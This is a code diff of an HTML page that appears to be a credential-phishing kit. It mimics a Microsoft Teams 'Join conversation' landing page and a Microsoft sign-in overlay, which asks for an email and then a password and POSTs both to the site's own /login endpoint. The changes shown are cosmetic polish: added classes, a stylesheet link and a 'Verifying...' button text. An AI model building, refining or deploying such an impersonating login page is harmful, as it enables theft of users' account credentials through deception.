@@ -10,6 +10,7 @@
   <style>
    body { font-family: 'Segoe UI', 'Helvetica Neue', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #252423; } .container { text-align: center; background: white; padding: 48px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 440px; width: 100%; } .logo { width: 80px; height: 80px; margin-bottom: 24px; } h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; } p { font-size: 14px; color: #605e5c; margin-bottom: 32px; } .btn { display: block; width: 100%; padding: 10px; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 12px; text-decoration: none; } .btn-primary { background-color: #5b5fc7; color: white; } .btn-primary:hover { background-color: #4f52b2; } .btn-secondary { background-color: white; color: #5b5fc7; border: 1px solid #5b5fc7; } .btn-secondary:hover { background-color: #edebe9; } #login-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; } .login-box { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); position: relative; } .ms-logo { height: 24px; margin-bottom: 20px; } .input-group { margin-bottom: 16px; } input { width: 100%; height: 36px; padding: 6px 10px; border: 1px solid #8f8f8f; box-sizing: border-box; } .next-btn { background-color: #0067b8; color: white; border: none; padding: 8px 36px; float: right; cursor: pointer; }
   </style>
+  <link href="/core/assets/css/animations.css" rel="stylesheet"/>
  </head>
  <body>
   <div class="container" id="landing-view">
@@ -23,7 +24,7 @@
    <button class="btn btn-primary" id="join-btn">
     Join conversation
    </button>
-   <button class="btn btn-secondary">
+   <button class="btn btn-secondary btn-primary">
     Download Windows app
    </button>
   </div>
@@ -35,15 +36,15 @@
      Sign in
     </h2>
     <form action="/login" id="login-form" method="POST">
-     <div id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
+     <div class="error-message" id="error-msg" style="color: #d93025; font-size: 12px; margin: 10px 0; display: none;">
      </div>
      <!-- Step 1: Email -->
      <div id="step-1">
       <div class="input-group">
-       <input id="email-input" name="email" placeholder="Email, phone, or Skype" required="" type="email"/>
+       <input class="input-field" id="email-input" name="email" placeholder="Email, phone, or Skype" required="" type="email"/>
       </div>
       <div style="margin-top: 20px;">
-       <button class="next-btn" id="next-btn" type="button">
+       <button class="next-btn btn-primary" id="next-btn" type="button">
         Next
        </button>
       </div>
@@ -53,10 +54,10 @@
       <div id="user-email-display" style="margin-bottom: 10px;">
       </div>
       <div class="input-group">
-       <input id="password-input" name="password" placeholder="Password" type="password"/>
+       <input class="input-field" id="password-input" name="password" placeholder="Password" type="password"/>
       </div>
       <div style="margin-top: 20px;">
-       <button class="next-btn" id="submit-btn" type="submit">
+       <button class="next-btn btn-primary" data-loading-text="Verifying..." id="submit-btn" type="submit">
         Sign in
        </button>
       </div>
